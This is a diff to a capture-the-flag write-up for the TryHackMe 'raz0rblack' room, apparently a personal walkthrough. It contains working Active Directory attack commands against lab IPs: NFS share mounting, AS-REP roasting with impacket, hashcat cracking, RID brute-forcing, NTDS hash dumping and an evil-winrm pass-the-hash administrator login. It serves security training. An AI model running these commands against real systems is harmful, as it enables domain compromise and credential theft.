@@ -4,18 +4,22 @@ https://tryhackme.com/room/raz0rblack
 
 A multi-stage room, a bit hard.
 
-01. Enum showed standard windows ports, a domain (fusion.corp) and a website on 80.
-02. crackmapexec smb 10.10.209.59
-03. root@kali$ mkdir users
-   root@kali$ mount -t nfs -o vers=2 10.10.209.59:/users ./users
-   root@kali$ cd users
-   root@kali$ ls
-   employee_status.xlsx  sbradley.txt
-   Extracted usernames from the xlsx file and create file users.txt (format used like sbradley)
+01. Enum showed standard windows ports, and a domain (raz0rblack.thm) 
+02. i used to enumerate the domain: root@kali$crackmapexec smb 10.10.209.59
+03. Enum NFS
+    root@kali$ showmount -e 10.10.73.116
+    Export list for 10.10.73.116:
+    /users (everyone)
+    root@kali$ mkdir users
+    root@kali$ mount -t nfs -o vers=2 10.10.73.116:/users ./users
+    root@kali$ cd users
+    root@kali$ ls
+    employee_status.xlsx  sbradley.txt
+    Extracted usernames from the xlsx file and create file users.txt (format used like sbradley)
 04. root@kali$ python3 /opt/impacket/examples/GetNPUsers.py 'raz0rblack.thm/' -usersfile users.txt -no-pass -dc-ip 10.10.209.59 -format hashcat -outputfile hashes.asreproast.txt
-   cracked the hash with E:\PENTEST\hashcat>hashcat32.exe -m 18200 hashes.asreproast.txt rockyou.txt --force
+    cracked the hash with E:\PENTEST\hashcat>hashcat32.exe -m 18200 hashes.asreproast.txt rockyou.txt --force
 05. Testing new creds on SMB
-   root@kali$ smbmap -H 10.10.73.116 -u twilliams -p password
+    root@kali$ smbmap -H 10.10.73.116 -u twilliams -p password
 06. bruteforce usernames
    root@kali$ crackmapexec smb 10.10.73.116 -u 'twilliams' -p 'password' --rid-brute
 07. Test if p password is reused
@@ -155,13 +159,16 @@ Dump the hashes:
 
 root@kali$ python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL
 
+root@kali$ evil-winrm -i 10.10.73.116 -u administrator -H hash
+
+*Evil-WinRM* PS C:\users\administrator\Documents> 
+
 
 Tools used:
 
 - impacket
 - kerbrute: https://github.com/ropnop/kerbrute
 - evil-winrm
-- hacktricks for guides on ldap enum: https://book.hacktricks.xyz/pentesting/pentesting-ldap
 - hacktricks for guides on privileges: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
 - https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1
 - https://github.com/giuliano108/SeBackupPrivilege
